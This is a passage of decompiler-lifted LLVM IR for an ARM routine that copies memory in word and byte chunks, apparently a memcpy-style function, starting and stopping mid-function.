  %v6_1b230 = icmp slt i32 %v1_1b230, 0
  store i1 %v6_1b230, i1* %cpsr_n.global-to-local, align 1
  %v7_1b230 = icmp eq i32 %v1_1b228, 20
  store i1 %v7_1b230, i1* %cpsr_z.global-to-local, align 1
  %v2_1b234 = xor i1 %v6_1b230, %v5_1b230
  br i1 %v2_1b234, label %dec_label_pc_1b268, label %dec_label_pc_1b238

dec_label_pc_1b238:                               ; preds = %dec_label_pc_1b230
  %v0_1b238 = load i32, i32* @r4, align 4
  store i32 %v0_1b238, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b23c

dec_label_pc_1b23c:                               ; preds = %dec_label_pc_1b23c.dec_label_pc_1b23c_crit_edge, %dec_label_pc_1b238
  %v0_1b240 = phi i32 [ %v12_1b248, %dec_label_pc_1b23c.dec_label_pc_1b23c_crit_edge ], [ %v0_1b24093, %dec_label_pc_1b238 ]
  %v0_1b23c = phi i32 [ %v0_1b23c.pre, %dec_label_pc_1b23c.dec_label_pc_1b23c_crit_edge ], [ %v0_1b23c92, %dec_label_pc_1b238 ]
  %v1_1b23c = inttoptr i32 %v0_1b23c to i32*
  %v2_1b23c = load i32, i32* %v1_1b23c, align 4
  %v3_1b23c = add i32 %v0_1b23c, 4
  %v4_1b23c = inttoptr i32 %v3_1b23c to i32*
  %v5_1b23c = load i32, i32* %v4_1b23c, align 4
  store i32 %v5_1b23c, i32* %r4.global-to-local, align 4
  %v6_1b23c = add i32 %v0_1b23c, 8
  %v7_1b23c = inttoptr i32 %v6_1b23c to i32*
  %v8_1b23c = load i32, i32* %v7_1b23c, align 4
  store i32 %v8_1b23c, i32* %ip.global-to-local, align 4
  %v9_1b23c = add i32 %v0_1b23c, 12
  %v10_1b23c = inttoptr i32 %v9_1b23c to i32*
  %v11_1b23c = load i32, i32* %v10_1b23c, align 4
  store i32 %v11_1b23c, i32* %lr.global-to-local, align 4
  %v12_1b23c = add i32 %v0_1b23c, 16
  store i32 %v12_1b23c, i32* %r1.global-to-local, align 4
  %v1_1b240 = inttoptr i32 %v0_1b240 to i32*
  store i32 %v2_1b23c, i32* %v1_1b240, align 4
  %v3_1b240 = add i32 %v0_1b240, 4
  %v4_1b240 = inttoptr i32 %v3_1b240 to i32*
  %v5_1b240 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b240, i32* %v4_1b240, align 4
  %v6_1b240 = add i32 %v0_1b240, 8
  %v7_1b240 = inttoptr i32 %v6_1b240 to i32*
  %v8_1b240 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_1b240, i32* %v7_1b240, align 4
  %v9_1b240 = add i32 %v0_1b240, 12
  %v10_1b240 = inttoptr i32 %v9_1b240 to i32*
  %v11_1b240 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1b240, i32* %v10_1b240, align 4
  %v12_1b240 = add i32 %v0_1b240, 16
  store i32 %v12_1b240, i32* %r0.global-to-local, align 4
  %v0_1b244 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b244 = inttoptr i32 %v0_1b244 to i32*
  %v2_1b244 = load i32, i32* %v1_1b244, align 4
  store i32 %v2_1b244, i32* @r3, align 4
  %v3_1b244 = add i32 %v0_1b244, 4
  %v4_1b244 = inttoptr i32 %v3_1b244 to i32*
  %v5_1b244 = load i32, i32* %v4_1b244, align 4
  store i32 %v5_1b244, i32* %r4.global-to-local, align 4
  %v6_1b244 = add i32 %v0_1b244, 8
  %v7_1b244 = inttoptr i32 %v6_1b244 to i32*
  %v8_1b244 = load i32, i32* %v7_1b244, align 4
  store i32 %v8_1b244, i32* @ip, align 4
  %v9_1b244 = add i32 %v0_1b244, 12
  %v10_1b244 = inttoptr i32 %v9_1b244 to i32*
  %v11_1b244 = load i32, i32* %v10_1b244, align 4
  store i32 %v11_1b244, i32* %lr.global-to-local, align 4
  %v12_1b244 = add i32 %v0_1b244, 16
  store i32 %v12_1b244, i32* %r1.global-to-local, align 4
  %v1_1b248 = inttoptr i32 %v12_1b240 to i32*
  store i32 %v2_1b244, i32* %v1_1b248, align 4
  %v3_1b248 = add i32 %v0_1b240, 20
  %v4_1b248 = inttoptr i32 %v3_1b248 to i32*
  %v5_1b248 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b248, i32* %v4_1b248, align 4
  %v6_1b248 = add i32 %v0_1b240, 24
  %v7_1b248 = inttoptr i32 %v6_1b248 to i32*
  %v8_1b248 = load i32, i32* @ip, align 4
  store i32 %v8_1b248, i32* %v7_1b248, align 4
  %v9_1b248 = add i32 %v0_1b240, 28
  %v10_1b248 = inttoptr i32 %v9_1b248 to i32*
  %v11_1b248 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1b248, i32* %v10_1b248, align 4
  %v12_1b248 = add i32 %v0_1b240, 32
  store i32 %v12_1b248, i32* %r0.global-to-local, align 4
  %v0_1b24c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b24c = add i32 %v0_1b24c, -32
  store i32 %v1_1b24c, i32* %r2.global-to-local, align 4
  %v3_1b24c = sub i32 31, %v0_1b24c
  %v4_1b24c = and i32 %v3_1b24c, %v0_1b24c
  %v5_1b24c = icmp slt i32 %v4_1b24c, 0
  %v6_1b24c = icmp slt i32 %v1_1b24c, 0
  %v2_1b250 = xor i1 %v6_1b24c, %v5_1b24c
  br i1 %v2_1b250, label %dec_label_pc_1b254, label %dec_label_pc_1b23c.dec_label_pc_1b23c_crit_edge

dec_label_pc_1b23c.dec_label_pc_1b23c_crit_edge:  ; preds = %dec_label_pc_1b23c
  %v0_1b23c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b23c

dec_label_pc_1b254:                               ; preds = %dec_label_pc_1b23c
  %v1_1b254 = add i32 %v0_1b24c, -16
  %v3_1b254 = add i32 %v0_1b24c, 2147483616
  %v4_1b254 = and i32 %v1_1b254, %v3_1b254
  %v5_1b254 = icmp slt i32 %v4_1b254, 0
  store i1 %v5_1b254, i1* %cpsr_v.global-to-local, align 1
  %v6_1b254 = icmp slt i32 %v1_1b254, 0
  store i1 %v6_1b254, i1* %cpsr_n.global-to-local, align 1
  %v7_1b254 = icmp eq i32 %v1_1b254, 0
  store i1 %v7_1b254, i1* %cpsr_z.global-to-local, align 1
  %v2_1b258 = xor i1 %v6_1b254, %v5_1b254
  br i1 %v2_1b258, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_1b254
  %v3_1b258 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b258 = inttoptr i32 %v3_1b258 to i32*
  %v5_1b258 = load i32, i32* %v4_1b258, align 4
  store i32 %v5_1b258, i32* @r3, align 4
  %v6_1b258 = add i32 %v3_1b258, 4
  %v7_1b258 = inttoptr i32 %v6_1b258 to i32*
  %v8_1b258 = load i32, i32* %v7_1b258, align 4
  store i32 %v8_1b258, i32* %r4.global-to-local, align 4
  %v9_1b258 = add i32 %v3_1b258, 8
  %v10_1b258 = inttoptr i32 %v9_1b258 to i32*
  %v11_1b258 = load i32, i32* %v10_1b258, align 4
  store i32 %v11_1b258, i32* @ip, align 4
  %v12_1b258 = add i32 %v3_1b258, 12
  %v13_1b258 = inttoptr i32 %v12_1b258 to i32*
  %v14_1b258 = load i32, i32* %v13_1b258, align 4
  store i32 %v14_1b258, i32* %lr.global-to-local, align 4
  %v15_1b258 = add i32 %v3_1b258, 16
  store i32 %v15_1b258, i32* %r1.global-to-local, align 4
  %v4_1b25c = inttoptr i32 %v12_1b248 to i32*
  store i32 %v5_1b258, i32* %v4_1b25c, align 4
  %v6_1b25c = add i32 %v0_1b240, 36
  %v7_1b25c = inttoptr i32 %v6_1b25c to i32*
  %v8_1b25c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1b25c, i32* %v7_1b25c, align 4
  %v9_1b25c = add i32 %v0_1b240, 40
  %v10_1b25c = inttoptr i32 %v9_1b25c to i32*
  %v11_1b25c = load i32, i32* @ip, align 4
  store i32 %v11_1b25c, i32* %v10_1b25c, align 4
  %v12_1b25c = add i32 %v0_1b240, 44
  %v13_1b25c = inttoptr i32 %v12_1b25c to i32*
  %v14_1b25c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1b25c, i32* %v13_1b25c, align 4
  %v15_1b25c = add i32 %v0_1b240, 48
  store i32 %v15_1b25c, i32* %r0.global-to-local, align 4
  %v3_1b260 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b260 = add i32 %v3_1b260, -16
  store i32 %v4_1b260, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_1b254, %bb136
  %v3_1b270101110 = phi i32 [ %v15_1b25c, %bb136 ], [ %v12_1b248, %dec_label_pc_1b254 ]
  %v0_1b268.pre = phi i32 [ %v4_1b260, %bb136 ], [ %v1_1b24c, %dec_label_pc_1b254 ]
  %v2_1b264 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b264, i32* @r4, align 4
  br label %dec_label_pc_1b268

dec_label_pc_1b268:                               ; preds = %dec_label_pc_1b230, %bb137
  %v3_1b270100 = phi i32 [ %v0_1b24093, %dec_label_pc_1b230 ], [ %v3_1b270101110, %bb137 ]
  %v0_1b268 = phi i32 [ %v1_1b230, %dec_label_pc_1b230 ], [ %v0_1b268.pre, %bb137 ]
  %v1_1b268 = add i32 %v0_1b268, 20
  store i32 %v1_1b268, i32* %r2.global-to-local, align 4
  %v3_1b268 = sub i32 0, %v0_1b268
  %v4_1b268 = and i32 %v1_1b268, %v3_1b268
  %v5_1b268 = icmp slt i32 %v4_1b268, 0
  store i1 %v5_1b268, i1* %cpsr_v.global-to-local, align 1
  %v6_1b268 = icmp slt i32 %v1_1b268, 0
  store i1 %v6_1b268, i1* %cpsr_n.global-to-local, align 1
  %v7_1b268 = icmp eq i32 %v1_1b268, 0
  store i1 %v7_1b268, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b26c

dec_label_pc_1b26c:                               ; preds = %.thread114, %dec_label_pc_1b268
  %v0_1b27c.pre157 = phi i32 [ %v0_1b27c.pre, %.thread114 ], [ %v1_1b268, %dec_label_pc_1b268 ]
  %v3_1b270 = phi i32 [ %v3_1b27098115, %.thread114 ], [ %v3_1b270100, %dec_label_pc_1b268 ]
  %v1_1b274 = phi i1 [ %v1_1b278, %.thread114 ], [ %v5_1b268, %dec_label_pc_1b268 ]
  %v0_1b274 = phi i1 [ %v0_1b278, %.thread114 ], [ %v6_1b268, %dec_label_pc_1b268 ]
  %v2_1b26c = xor i1 %v1_1b274, %v0_1b274
  br i1 %v2_1b26c, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_1b26c
  %v3_1b26c = load i32, i32* %r1.global-to-local, align 4
  %v4_1b26c = inttoptr i32 %v3_1b26c to i32*
  %v5_1b26c = load i32, i32* %v4_1b26c, align 4
  store i32 %v5_1b26c, i32* @r3, align 4
  %v6_1b26c = add i32 %v3_1b26c, 4
  %v7_1b26c = inttoptr i32 %v6_1b26c to i32*
  %v8_1b26c = load i32, i32* %v7_1b26c, align 4
  store i32 %v8_1b26c, i32* @ip, align 4
  %v9_1b26c = add i32 %v3_1b26c, 8
  %v10_1b26c = inttoptr i32 %v9_1b26c to i32*
  %v11_1b26c = load i32, i32* %v10_1b26c, align 4
  store i32 %v11_1b26c, i32* %lr.global-to-local, align 4
  %v12_1b26c = add i32 %v3_1b26c, 12
  store i32 %v12_1b26c, i32* %r1.global-to-local, align 4
  %v4_1b270 = inttoptr i32 %v3_1b270 to i32*
  store i32 %v5_1b26c, i32* %v4_1b270, align 4
  %v6_1b270 = add i32 %v3_1b270, 4
  %v7_1b270 = inttoptr i32 %v6_1b270 to i32*
  %v8_1b270 = load i32, i32* @ip, align 4
  store i32 %v8_1b270, i32* %v7_1b270, align 4
  %v9_1b270 = add i32 %v3_1b270, 8
  %v10_1b270 = inttoptr i32 %v9_1b270 to i32*
  %v11_1b270 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1b270, i32* %v10_1b270, align 4
  %v12_1b270 = add i32 %v3_1b270, 12
  store i32 %v12_1b270, i32* %r0.global-to-local, align 4
  %v3_1b274 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b274 = add i32 %v3_1b274, -12
  store i32 %v4_1b274, i32* %r2.global-to-local, align 4
  %v6_1b274 = sub i32 11, %v3_1b274
  %v7_1b274 = and i32 %v6_1b274, %v3_1b274
  %v8_1b274 = icmp slt i32 %v7_1b274, 0
  store i1 %v8_1b274, i1* %cpsr_v.global-to-local, align 1
  %v9_1b274 = icmp slt i32 %v4_1b274, 0
  store i1 %v9_1b274, i1* %cpsr_n.global-to-local, align 1
  %v10_1b274 = icmp eq i32 %v3_1b274, 12
  store i1 %v10_1b274, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_1b26c, %bb138
  %v0_1b27c.pre = phi i32 [ %v4_1b274, %bb138 ], [ %v0_1b27c.pre157, %dec_label_pc_1b26c ]
  %v3_1b27098115 = phi i32 [ %v12_1b270, %bb138 ], [ %v3_1b270, %dec_label_pc_1b26c ]
  %v1_1b278 = phi i1 [ %v8_1b274, %bb138 ], [ %v1_1b274, %dec_label_pc_1b26c ]
  %v0_1b278 = phi i1 [ %v9_1b274, %bb138 ], [ %v0_1b274, %dec_label_pc_1b26c ]
  %v2_1b278 = xor i1 %v1_1b278, %v0_1b278
  br i1 %v2_1b278, label %dec_label_pc_1b27c, label %dec_label_pc_1b26c

dec_label_pc_1b27c:                               ; preds = %.thread114, %dec_label_pc_1b228
  %v4_1b28c = phi i32 [ %v0_1b24093, %dec_label_pc_1b228 ], [ %v3_1b27098115, %.thread114 ]
  %v0_1b27c = phi i32 [ %v1_1b228, %dec_label_pc_1b228 ], [ %v0_1b27c.pre, %.thread114 ]
  %v1_1b27c = add i32 %v0_1b27c, 8
  store i32 %v1_1b27c, i32* %r2.global-to-local, align 4
  %v3_1b27c = sub i32 0, %v0_1b27c
  %v4_1b27c = and i32 %v1_1b27c, %v3_1b27c
  %v5_1b27c = icmp slt i32 %v4_1b27c, 0
  store i1 %v5_1b27c, i1* %cpsr_v.global-to-local, align 1
  %v6_1b27c = icmp slt i32 %v1_1b27c, 0
  store i1 %v6_1b27c, i1* %cpsr_n.global-to-local, align 1
  %v7_1b27c = icmp eq i32 %v1_1b27c, 0
  store i1 %v7_1b27c, i1* %cpsr_z.global-to-local, align 1
  %v2_1b280 = xor i1 %v6_1b27c, %v5_1b27c
  br i1 %v2_1b280, label %bb140, label %dec_label_pc_1b284

dec_label_pc_1b284:                               ; preds = %dec_label_pc_1b27c
  %v1_1b284 = add i32 %v0_1b27c, 4
  store i32 %v1_1b284, i32* %r2.global-to-local, align 4
  %v3_1b284 = sub i32 -5, %v0_1b27c
  %v4_1b284 = and i32 %v3_1b284, %v1_1b27c
  %v5_1b284 = icmp slt i32 %v4_1b284, 0
  store i1 %v5_1b284, i1* %cpsr_v.global-to-local, align 1
  %v6_1b284 = icmp slt i32 %v1_1b284, 0
  store i1 %v6_1b284, i1* %cpsr_n.global-to-local, align 1
  %v7_1b284 = icmp eq i32 %v1_1b27c, 4
  store i1 %v7_1b284, i1* %cpsr_z.global-to-local, align 1
  %v2_1b288 = xor i1 %v6_1b284, %v5_1b284
  %v3_1b288 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b288 = inttoptr i32 %v3_1b288 to i32*
  %v5_1b288 = load i32, i32* %v4_1b288, align 4
  store i32 %v5_1b288, i32* @r3, align 4
  %v7_1b288 = add i32 %v3_1b288, 4
  br i1 %v2_1b288, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_1b284
  store i32 %v7_1b288, i32* %r1.global-to-local, align 4
  %v5_1b28c = inttoptr i32 %v4_1b28c to i32*
  store i32 %v5_1b288, i32* %v5_1b28c, align 4
  %v6_1b28c = load i32, i32* %r0.global-to-local, align 4
  %v7_1b28c = add i32 %v6_1b28c, 4
  store i32 %v7_1b28c, i32* %r0.global-to-local, align 4
  %v0_1b29c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_1b284
  %v7_1b290 = inttoptr i32 %v7_1b288 to i32*
  %v8_1b290 = load i32, i32* %v7_1b290, align 4
  store i32 %v8_1b290, i32* @ip, align 4
  %v9_1b290 = add i32 %v3_1b288, 8
  store i32 %v9_1b290, i32* %r1.global-to-local, align 4
  %v4_1b294 = inttoptr i32 %v4_1b28c to i32*
  store i32 %v5_1b288, i32* %v4_1b294, align 4
  %v6_1b294 = add i32 %v4_1b28c, 4
  %v7_1b294 = inttoptr i32 %v6_1b294 to i32*
  %v8_1b294 = load i32, i32* @ip, align 4
  store i32 %v8_1b294, i32* %v7_1b294, align 4
  %v9_1b294 = add i32 %v4_1b28c, 8
  store i32 %v9_1b294, i32* %r0.global-to-local, align 4
  %v3_1b298 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b298 = add i32 %v3_1b298, -4
  store i32 %v4_1b298, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_1b27c, %bb, %dec_label_pc_1b44c, %dec_label_pc_1b3e0, %dec_label_pc_1b374, %bb139
  %v0_1b29c = phi i32 [ %v0_1b29c.pre, %.thread121 ], [ %v2_1b2ec, %.thread127 ], [ %v1_1b27c, %dec_label_pc_1b27c ], [ %v2_1b210, %bb ], [ %v0_1b29c60, %dec_label_pc_1b44c ], [ %v0_1b29c59, %dec_label_pc_1b3e0 ], [ %v0_1b29c58, %dec_label_pc_1b374 ], [ %v4_1b298, %bb139 ]
  %v1_1b29c = add i32 %v0_1b29c, 4
  store i32 %v1_1b29c, i32* %r2.global-to-local, align 4
  %v3_1b29c = sub i32 0, %v0_1b29c
  %v4_1b29c = and i32 %v1_1b29c, %v3_1b29c
  %v5_1b29c = icmp slt i32 %v4_1b29c, 0
  store i1 %v5_1b29c, i1* %cpsr_v.global-to-local, align 1
  %v6_1b29c = icmp slt i32 %v1_1b29c, 0
  store i1 %v6_1b29c, i1* %cpsr_n.global-to-local, align 1
  %v7_1b29c = icmp eq i32 %v1_1b29c, 0
  store i1 %v7_1b29c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b29c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_1b2a4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_1b2a0 = load i8*, i8** %stack_var_-8, align 4
  %v4_1b2a0 = ptrtoint i8* %v3_1b2a0 to i32
  store i32 %v4_1b2a0, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_1b2a4 = phi i32 [ %v0_1b2a4.pre, %bb140.bb142_crit_edge ], [ %v8_1b20c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1b29c, i32 %v0_1b2a4)
  %v0_1b2a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2a8 = add i32 %v0_1b2a8, -2
  %v3_1b2a8 = sub i32 1, %v0_1b2a8
  %v4_1b2a8 = and i32 %v3_1b2a8, %v0_1b2a8
  %v5_1b2a8 = icmp slt i32 %v4_1b2a8, 0
  store i1 %v5_1b2a8, i1* %cpsr_v.global-to-local, align 1
  %v6_1b2a8 = icmp slt i32 %v1_1b2a8, 0
  store i1 %v6_1b2a8, i1* %cpsr_n.global-to-local, align 1
  %v7_1b2a8 = icmp eq i32 %v0_1b2a8, 2
  store i1 %v7_1b2a8, i1* %cpsr_z.global-to-local, align 1
  %v0_1b2ac = load i32, i32* %r1.global-to-local, align 4
  %v1_1b2ac = inttoptr i32 %v0_1b2ac to i8*
  %v2_1b2ac = load i8, i8* %v1_1b2ac, align 1
  %v5_1b2ac = add i32 %v0_1b2ac, 1
  store i32 %v5_1b2ac, i32* %r1.global-to-local, align 4
  %v2_1b2b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b2b0 = inttoptr i32 %v2_1b2b0 to i8*
  store i8 %v2_1b2ac, i8* %v3_1b2b0, align 1
  %v4_1b2b0 = load i32, i32* %r0.global-to-local, align 4
  %v5_1b2b0 = add i32 %v4_1b2b0, 1
  store i32 %v5_1b2b0, i32* %r0.global-to-local, align 4
  %v0_1b2b4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1b2b4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1b2b4 = xor i1 %v0_1b2b4, %v1_1b2b4
  br i1 %v2_1b2b4, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_1b2b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b2b4 = inttoptr i32 %v3_1b2b4 to i8*
  %v5_1b2b4 = load i8, i8* %v4_1b2b4, align 1
  %v8_1b2b4 = add i32 %v3_1b2b4, 1
  store i32 %v8_1b2b4, i32* %r1.global-to-local, align 4
  %v6_1b2b8 = inttoptr i32 %v5_1b2b0 to i8*
  store i8 %v5_1b2b4, i8* %v6_1b2b8, align 1
  %v7_1b2b8 = load i32, i32* %r0.global-to-local, align 4
  %v8_1b2b8 = add i32 %v7_1b2b8, 1
  store i32 %v8_1b2b8, i32* %r0.global-to-local, align 4
  %v1_1b2bc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1b2bc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_1b2c0 = phi i32 [ %v8_1b2b8, %bb143 ], [ %v5_1b2b0, %bb142 ]
  %v2_1b2c0 = phi i1 [ %v2_1b2bc.pre, %bb143 ], [ %v1_1b2b4, %bb142 ]
  %v1_1b2c0 = phi i1 [ %v1_1b2bc.pre, %bb143 ], [ %v0_1b2b4, %bb142 ]
  %v0_1b2bc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1b2bc = xor i1 %v2_1b2c0, %v1_1b2c0
  %v4_1b2bc = or i1 %v0_1b2bc, %v3_1b2bc
  br i1 %v4_1b2bc, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_1b2bc = load i32, i32* %r1.global-to-local, align 4
  %v6_1b2bc = inttoptr i32 %v5_1b2bc to i8*
  %v7_1b2bc = load i8, i8* %v6_1b2bc, align 1
  %v10_1b2bc = add i32 %v5_1b2bc, 1
  store i32 %v10_1b2bc, i32* %r1.global-to-local, align 4
  %v8_1b2c0 = inttoptr i32 %v7_1b2c0 to i8*
  store i8 %v7_1b2bc, i8* %v8_1b2c0, align 1
  %v9_1b2c0 = load i32, i32* %r0.global-to-local, align 4
  %v10_1b2c0 = add i32 %v9_1b2c0, 1
  store i32 %v10_1b2c0, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_1b2c4 = load i8*, i8** %stack_var_-8, align 4
  %v3_1b2c4 = ptrtoint i8* %v2_1b2c4 to i32
  store i32 %v3_1b2c4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_1b20c)
  %v0_1b2cc.pre = load i32, i32* @ip, align 4
  %v0_1b2d4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_1b2d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b2cc

dec_label_pc_1b2cc:                               ; preds = %dec_label_pc_1b218, %.thread125
  %v2_1b2d8 = phi i32 [ %v1_1b200, %dec_label_pc_1b218 ], [ %v2_1b2d8.pre, %.thread125 ]
  %v0_1b2d4 = phi i32 [ %v0_1b200, %dec_label_pc_1b218 ], [ %v0_1b2d4.pre, %.thread125 ]
  %v0_1b2cc = phi i32 [ %v1_1b218, %dec_label_pc_1b218 ], [ %v0_1b2cc.pre, %.thread125 ]
  %v1_1b2cc = sub i32 4, %v0_1b2cc
  store i32 %v1_1b2cc, i32* @ip, align 4
  %v1_1b2d0 = add i32 %v1_1b2cc, -2
  %v3_1b2d0 = sub i32 1, %v1_1b2cc
  %v4_1b2d0 = and i32 %v3_1b2d0, %v1_1b2cc
  %v5_1b2d0 = icmp slt i32 %v4_1b2d0, 0
  store i1 %v5_1b2d0, i1* %cpsr_v.global-to-local, align 1
  %v6_1b2d0 = icmp slt i32 %v1_1b2d0, 0
  store i1 %v6_1b2d0, i1* %cpsr_n.global-to-local, align 1
  %v7_1b2d0 = icmp eq i32 %v1_1b2cc, 2
  store i1 %v7_1b2d0, i1* %cpsr_z.global-to-local, align 1
  %v1_1b2d4 = inttoptr i32 %v0_1b2d4 to i8*
  %v2_1b2d4 = load i8, i8* %v1_1b2d4, align 1
  %v3_1b2d4 = zext i8 %v2_1b2d4 to i32
  store i32 %v3_1b2d4, i32* @r3, align 4
  %v5_1b2d4 = add i32 %v0_1b2d4, 1
  store i32 %v5_1b2d4, i32* %r1.global-to-local, align 4
  %v3_1b2d8 = inttoptr i32 %v2_1b2d8 to i8*
  store i8 %v2_1b2d4, i8* %v3_1b2d8, align 1
  %v4_1b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v5_1b2d8 = add i32 %v4_1b2d8, 1
  store i32 %v5_1b2d8, i32* %r0.global-to-local, align 4
  %v0_1b2dc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1b2dc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1b2dc = xor i1 %v0_1b2dc, %v1_1b2dc
  br i1 %v2_1b2dc, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_1b2cc
  %v3_1b2dc = load i32, i32* %r1.global-to-local, align 4
  %v4_1b2dc = inttoptr i32 %v3_1b2dc to i8*
  %v5_1b2dc = load i8, i8* %v4_1b2dc, align 1
  %v6_1b2dc = zext i8 %v5_1b2dc to i32
  store i32 %v6_1b2dc, i32* @r3, align 4
  %v8_1b2dc = add i32 %v3_1b2dc, 1
  store i32 %v8_1b2dc, i32* %r1.global-to-local, align 4
  %v6_1b2e0 = inttoptr i32 %v5_1b2d8 to i8*
  store i8 %v5_1b2dc, i8* %v6_1b2e0, align 1
  %v7_1b2e0 = load i32, i32* %r0.global-to-local, align 4
  %v8_1b2e0 = add i32 %v7_1b2e0, 1
  store i32 %v8_1b2e0, i32* %r0.global-to-local, align 4
  %v1_1b2e4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1b2e4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_1b2cc, %bb145
  %v7_1b2e8 = phi i32 [ %v8_1b2e0, %bb145 ], [ %v5_1b2d8, %dec_label_pc_1b2cc ]
  %v2_1b2e8 = phi i1 [ %v2_1b2e4.pre, %bb145 ], [ %v1_1b2dc, %dec_label_pc_1b2cc ]
  %v1_1b2e8 = phi i1 [ %v1_1b2e4.pre, %bb145 ], [ %v0_1b2dc, %dec_label_pc_1b2cc ]
  %v0_1b2e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1b2e4 = xor i1 %v2_1b2e8, %v1_1b2e8
  %v4_1b2e4 = or i1 %v0_1b2e4, %v3_1b2e4
  br i1 %v4_1b2e4, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_1b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v6_1b2e4 = inttoptr i32 %v5_1b2e4 to i8*
  %v7_1b2e4 = load i8, i8* %v6_1b2e4, align 1
  %v8_1b2e4 = zext i8 %v7_1b2e4 to i32
  store i32 %v8_1b2e4, i32* @r3, align 4
  %v10_1b2e4 = add i32 %v5_1b2e4, 1
  store i32 %v10_1b2e4, i32* %r1.global-to-local, align 4
  %v8_1b2e8 = inttoptr i32 %v7_1b2e8 to i8*
  store i8 %v7_1b2e4, i8* %v8_1b2e8, align 1
  %v9_1b2e8 = load i32, i32* %r0.global-to-local, align 4
  %v10_1b2e8 = add i32 %v9_1b2e8, 1
  store i32 %v10_1b2e8, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_1b41c76 = phi i32 [ %v10_1b2e8, %bb146 ], [ %v7_1b2e8, %.thread126 ]
  %v0_1b2ec = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2ec = load i32, i32* @ip, align 4
  %v2_1b2ec = sub i32 %v0_1b2ec, %v1_1b2ec
  store i32 %v2_1b2ec, i32* %r2.global-to-local, align 4
  %v4_1b2ec = xor i32 %v1_1b2ec, %v0_1b2ec
  %v5_1b2ec = xor i32 %v2_1b2ec, %v0_1b2ec
  %v6_1b2ec = and i32 %v5_1b2ec, %v4_1b2ec
  %v7_1b2ec = icmp slt i32 %v6_1b2ec, 0
  store i1 %v7_1b2ec, i1* %cpsr_v.global-to-local, align 1
  %v8_1b2ec = icmp slt i32 %v2_1b2ec, 0
  store i1 %v8_1b2ec, i1* %cpsr_n.global-to-local, align 1
  %v9_1b2ec = icmp eq i32 %v0_1b2ec, %v1_1b2ec
  store i1 %v9_1b2ec, i1* %cpsr_z.global-to-local, align 1
  %v2_1b2f0 = xor i1 %v8_1b2ec, %v7_1b2ec
  br i1 %v2_1b2f0, label %bb140, label %dec_label_pc_1b2f4

dec_label_pc_1b2f4:                               ; preds = %.thread127
  %v0_1b2f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b2f4 = urem i32 %v0_1b2f4, 4
  store i32 %v1_1b2f4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b2f4 = icmp eq i32 %v1_1b2f4, 0
  store i1 %v2_1b2f4, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_1b2f4 to i2
  br i1 %v2_1b2f4, label %dec_label_pc_1b228, label %dec_label_pc_1b2fc

